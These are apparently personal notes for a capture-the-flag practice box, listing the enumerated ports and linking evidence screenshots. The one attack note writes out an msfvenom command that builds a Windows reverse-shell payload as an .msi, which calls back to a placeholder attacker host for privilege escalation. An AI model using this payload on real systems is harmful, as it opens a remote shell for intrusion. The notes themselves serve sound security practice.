# Shenzi

Sanitized practice-box notes. Folder layout matches the Obsidian template: **General Info → External (per port) → Exploit → Internal / Priv Esc → Loot**, with **Evidence** next to the phase where the screenshot was taken.

| | |
| --- | --- |
| OS (guess from ports) | Unknown |
| Notes | Personal walkthrough, not a spoiler-free writeup |

## Layout

- [General Info](General-Info.md)
- [Exploit](Exploit.md)
- [Loot](Loot.md)
- [External](External/) — per-port enumeration
- [Internal / Priv Esc](Internal/Priv-Esc.md)

### Ports touched

- `135-RPC`
- `139-netbios-ssn`
- `21-FTP`
- `3306-MYSQL`
- `443-https`
- `49664-49669-Microsoft-Windows-RPC`
- `80-http`

## Attack notes

found something interesting... this means that I can execute any kind of .msi file extension with system level permissions So i created a payload in the .msi format -> msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER LPORT=4442 -f msi -o reverse_4442.msi

### Commands used

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER LPORT=4442 -f msi -o reverse_4442.msi
```


### References

- _(none)_

## Evidence

![Pasted image 20240627142258.png](Internal/Evidence/Pasted%20image%2020240627142258.png)

![Pasted image 20240627164305.png](Internal/Evidence/Pasted%20image%2020240627164305.png)

![Pasted image 20240627165248.png](Internal/Evidence/Pasted%20image%2020240627165248.png)

![Pasted image 20240627165329.png](Internal/Evidence/Pasted%20image%2020240627165329.png)

![Pasted image 20240627141801.png](External/Evidence/Pasted%20image%2020240627141801.png)

![Pasted image 20240626221255.png](External/Evidence/Pasted%20image%2020240626221255.png)

![Pasted image 20240627141433.png](External/Evidence/Pasted%20image%2020240627141433.png)

![Pasted image 20240626224923.png](External/Evidence/Pasted%20image%2020240626224923.png)

![Pasted image 20240626215109.png](External/Evidence/Pasted%20image%2020240626215109.png)

![Pasted image 20240626214940.png](External/Evidence/Pasted%20image%2020240626214940.png)

![Pasted image 20240626214834.png](External/Evidence/Pasted%20image%2020240626214834.png)

![Pasted image 20240626213046.png](External/Evidence/Pasted%20image%2020240626213046.png)
